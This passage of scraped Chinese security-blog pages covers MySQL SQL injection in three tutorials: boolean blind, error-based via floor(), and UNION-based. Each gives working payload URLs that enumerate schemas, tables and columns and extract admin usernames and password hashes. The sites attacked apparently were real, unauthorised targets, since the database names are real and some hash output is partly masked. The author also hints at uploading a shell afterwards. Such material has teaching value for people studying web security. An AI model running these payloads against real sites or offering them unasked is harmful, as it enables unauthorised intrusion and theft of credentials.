<p>获取第二个数据库名的第一位字符,并返回其对应的ASCII码值,依次递增查出完整信息,第一个数据库名为’wexnepal_2012’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and (select ascii(substring((select schema_name from information_schema.schemata limit 1,1),1,1))=119) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool11.png" alt="&#39;&#39;"><br></p>
<p>8,接着,获取’wexnepal_2012’库中的所有表名<br>获取第一张表名的第一位字符,并返回其对应的ASCII码值,依次递增把当前库中的所有表名都查出来即可,最后,确认实际的管理表名为 ‘tbl_admin_user’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and (select ascii(substring((select table_name from information_schema.tables where table_schema=0x7765786e6570616c5f32303132 limit 0,1),1,1))=116) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool12.png" alt="&#39;&#39;"><br></p>
<p>9,有了管理表名,下一步就该把该表中的所有字段名都查出来了,依旧是上面的方法<br>查询’tbl_admin_user’表中的第一个字段名的第一位字符,并返回其对应的ASCII码值,最后确认实际的账号密码字段名分别为’admin_username’,’admin_password’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and (select ascii(substring((select column_name from information_schema.columns where table_name=0x74626c5f61646d696e5f75736572 limit 0,1),1,1))=97) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool13.png" alt="&#39;&#39;"><br></p>
<p>10,现在管理表名字段名都有了,下一步只需要慢慢把每个字段对应的实际数据查出来即可<br>获取’admin_username’字段下的第一条记录的第一位字符,并返回其对应的ASCII码值,依次递增,查出完整用户名即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and (select ascii(substring((select admin_username from tbl_admin_user limit 0,1),1,1))=119) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool14.png" alt="&#39;&#39;"><br></p>
<p>获取’admin_password’字段下的第一条记录的第一位字符,并返回其对应的ASCII码值,依次递增,查出完整密码数据即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/wexpage</span>.php?id=<span class="number">21</span><span class="string">' and (select ascii(substring((select admin_password from tbl_admin_user limit 0,1),1,1))=49) %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_bind_bool15.png" alt="&#39;&#39;"><br></p>
<p>11,最终,得到的管理员账号密码完整数据如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">wexnepal:</span><span class="number">194</span>fb91445ebd552e7ab75457*****</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;这里只是简单说明了盲注里面的最基本的一种方法(基于布尔的盲注),另外还有基于时间和错误的盲注,思路流程几乎是一模一样的,同样是一位位字符的截取,只是用的函数不一样而已,换汤不换药,稍微改下语句即可,非常简单,这里就不再重复啰嗦了,大家可以看到,既是是盲注,也并不是什么很高深的注入技术,所有的复杂都是基础堆积的结果,最多可能只是在这之前,大家都没想到原来还可以这么查数据而已,可能有些繁琐,但语句还是非常好理解的,关键在于大家对各种数据库单行函数的理解和灵活应用,自己要记得多实践,以不断加深自己对盲注的理解,另外,如果真的是手工这样猜,肯定会累死,实际中我们更多都是配合burpsuite一起来完成整个过程<br><br></p>

          
        
      
    </div>
    
    
    


    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/mysql-error-injection.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VK">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Evil-404">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/mysql-error-injection.html" itemprop="url">sql注入入门 之 mysql 显错注入 [ floor()显错 ]</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-13T21:23:32+08:00">
                2016-05-13
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于&#58;</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2017-06-24T23:56:04+08:00">
                2017-06-24
              </time>
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            

            

              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/all-sql-injection/" itemprop="url" rel="index">
                    <span itemprop="name">all sql injection</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1,966
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  9
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><br><br>1,实例显错型 mysql 注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error1.png" alt="&#39;&#39;"><br></p>
<p>2,尝试单引号后,目标如期报错,很好,我们要的正是这个报错信息,因为后面的查询全都要靠它,另外,从报错信息来看,我们知道目标是linux的机器,网站的物理路径也顺便送给了我们,如果root的注入点,我们岂不是,嘿嘿……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error2.png" alt="&#39;&#39;"><br></p>
<p>3,同样,虽然这里打眼一看可能又会以为是个数字型注入,但其实后端依然是把它当做字符串来接收的,所以,就需要我们把前后的单引号都闭合掉<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">'and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error2_1.png" alt="&#39;&#39;"><br></p>
<p>4,成功闭合后,就可以继续正常查询各种数据,还是习惯性的先搜集下目标数据库的相关信息<br>获取当前数据库版本<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error3.png" alt="&#39;&#39;"><br></p>
<p>获取当前数据库用户权限<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error4.png" alt="&#39;&#39;"><br></p>
<p>查看当前数据库名,可知当前数据库名为 ‘jamesbaird_pcba’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error5.png" alt="&#39;&#39;"><br></p>
<p>查看目标的机器名,可能有时候我们希望根据目标的机器名来大致判断当前机器是干啥的,以此来确定其价值的高低……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,@@hostname,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error6.png" alt="&#39;&#39;"><br></p>
<p>查看目标mysql的安装路径,创建自定义函数时可能会用到<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,@@basedir,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error7.png" alt="&#39;&#39;"><br></p>
<p>5,搜集完相关信息以后,我们开始查询真正的数据,首先,列出所有的数据库名(依然是你有权限看的’所有’),同样是利用limit<br>获取第一个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error8.png" alt="&#39;&#39;"><br></p>
<p>获取第二个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error9.png" alt="&#39;&#39;"><br></p>
<p>获取第三个数据库名,从前面我们已经知道,这个是我们当前所在的库<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 2,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error10.png" alt="&#39;&#39;"><br></p>
<p>获取第四个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 3,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error11.png" alt="&#39;&#39;"><br></p>
<p>6,有了所有的数据库名以后,我们就可以开始查表名了,首先,查出当前库中的所有表名,当然,我们的最终目的还是为了找到目标网站的管理表,不一定非要把所有的表名都查出来,找到管理表,只要拿到账号密码即可</p>
<p>从当前库中获取第一张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error12.png" alt="&#39;&#39;"><br></p>
<p>接着依次获取第二张表名,第三张表名,……其实,中间还查出来很多表,但并不是我想要的,所以中间的过程我就都省略了,不过,最终也还是没能找到我们想要的那张管理表,没办法,只能跨库查了,当然,跨库肯定是有前提的,你只能跨到你有权限跨进的库中,废话不多讲,我们继续查<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error13.png" alt="&#39;&#39;"><br></p>
<p>直到当我查到’jamesbaird_current’这个库时,一眼就发现了’wp_’ 前缀,有经验的一眼就看出来了,这是个wordpress程序的数据库,既是开源程序,库表结构自然就非常清晰了(一般情况下很少人会改它原来的库表结构,因为那样可能意味着要大篇幅重构代码,如果不是做深度二次开发,最多可能只会在原有的库表基础上加表加功能),下面的十六进制数据表示的是’jamesbaird_current’库名,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=0x6a616d657362616972645f63757272656e74 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error14.png" alt="&#39;&#39;"><br></p>
<p>7,按说,我们现在就可以直接去查出管理员的账号密码,因为wordpress默认的管理表名和该表中的字段名我们早已了如指掌,为了文章完整性,这里还是一步步的来吧<br>获取第二个字段名,用户名字段,下面的十六进制数据表示的是’wp_users’的表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x77705f7573657273 LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error15.png" alt="&#39;&#39;"><br></p>
<p>获取第三个字段名,密码字段<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x77705f7573657273 LIMIT 2,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error16.png" alt="&#39;&#39;"><br></p>
<p>8,现在,直接从wp_users表中获取管理员的账号和密码hash即可,至此,一次基本的mysql显错注入就算完成了,虽然我们现在查到的账号密码可能并不是这个网站的后台管理账号密码,但起码我们知道它肯定有一个wordpress程序存在,找到那个wordpress所在的地址,然后登进去,传shell也是一样的,可那并不是今天的重点,这里我也不啰嗦了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user_login,0x3a,user_pass,0x23) FROM jamesbaird_current.wp_users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and  '</span>s<span class="string">'='</span>s</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_error17.png" alt="&#39;&#39;"><br></p>
<p>9,最终,我们得到的管理员的账号密码如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">admin:</span><span class="number">5</span>ce14b22a4406974b33dfcaa****** (md5的hash,相必这个wordpress版本必然很低)</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;这里也只是简单演示了在显错注入中最常用的一种,基于floor()函数的,关于另外两个函数的利用和这个方式都基本一致,语句稍微变下即可,这里就不再重复啰嗦了,另外,今天的重点只是想让大家明白怎么通过显错进行注入,注入语句可能一眼看上去比较难懂,但从里往外一句句拆出来执行就知道什么意思了,其实不难,关键是自己一定要有耐心<br><br></p>

          
        
      
    </div>
    
    
    


    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/mysql-common-injection.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VK">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Evil-404">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/mysql-common-injection.html" itemprop="url">sql注入入门 之 mysql 常规注入 [ union方式 ]</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-12T08:47:15+08:00">
                2016-05-12
              </time>
            

            
              <span class="post-meta-divider">|</span>
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-check-o"></i>
              </span>
              
                <span class="post-meta-item-text">更新于&#58;</span>
              
              <time title="更新于" itemprop="dateModified" datetime="2017-06-24T23:57:10+08:00">
                2017-06-24
              </time>
            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            

            

              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/all-sql-injection/" itemprop="url" rel="index">
                    <span itemprop="name">all sql injection</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1,823
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  8
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><br><br>1,常规数字型 mysql 实例注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm1.png" alt="&#39;&#39;"><br></p>
<p>2,依旧先尝试下经典的单引号,如下,虽然没暴露出明显的数据库报错信息,但我们发现,此时返回的页面已经异常了,经验判断,十有八九是个注入点,先不管那么多,我们继续<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm2.png" alt="&#39;&#39;"><br></p>
<p>3,我们再进一步确认注入点,可能表面一眼看去,也许你会认为它是个数字型注入点,其实,它是个字符型的,关于字符型的闭合比较简单,你可以选择把前后的单引号都闭合掉,或者你也可以选择只闭合前面的单引号,然后把后面多余的语句都注释掉也行,随你,只要能保证我们的语句能正常执行即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and '</span>s<span class="string">'='</span>s 	条件为真时,页面返回正常</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm3.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and '</span>s<span class="string">'='</span>sk  条件为假时,页面返回异常</span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_comm4.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=12 --+-  条件为真时,页面返回正常</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_comm5.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 --+- 条件为假时,页面返回异常</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_comm6.png" alt="&#39;&#39;"><br></p>
<p>4,确认为真正的注入点后,我们就可以开始查询各种数据,首先,确定下当前表准确的字段个数,为后面执行union做准备<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' order by 28 --+- 为28返回正常</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm7.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' order by 29 --+- 为29时返回错误,确认当前表的字段个数为28个</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_comm8.png" alt="&#39;&#39;"><br></p>
<p>5,有了确切的字段个数,我们继续执行union爆出对应的数据显示位(爆出对应数据显示位的目的,其实就是要把后续从数据库查出来的各种结果都显示到这些位置上,说的通俗点儿,我们查出来的数据在页面上总得有个地方放吧,要不然我们怎么看呢)<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm9.png" alt="&#39;&#39;"><br></p>
<p>6,搜集当前数据库的各种相关信息,比如,当前数据库用户权限(这里暂时以普通数据库用户权限为例进行演示,关于root权限下的注入方法,后续还会有单独说明),当前数据版本,当前数据库名,目标操作系统类型,目标主机名,数据文件的存放目录,数据库的安装目录等等……实际测试中,不一定非要每次都把信息都查出来,只查对你有用的即可,这里纯粹只是为了大家方便,所以说的相对比较详细<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 UNION SELECT 1,2,3,4,user(),6,version(),8,9,10,11,12,13,database(),15,@@version_compile_os,@@hostname,@@datadir,19,20,21,@@basedir,23,24,25,26,27,28 --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm10.png" alt="&#39;&#39;"><br></p>
<p>7,对基本情况有所有了解后,接着就可以查出’所有’的数据库名了,当然,这里的’所有’并非真正的’所有’,它指的是当前数据库用户有权限看到的那些数据库,以此注入点为例,目前就只能看到 information_schema,homoeopathy_university 这俩数据库<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.vuln.com/md</span>_materia_profile_view.php?viewid=<span class="number">2</span><span class="string">' and 12=124 UNION SELECT 1,2,3,4,5,6,group_concat(schema_name),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 from information_schema.schemata --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_comm11.png" alt="&#39;&#39;"><br></p>
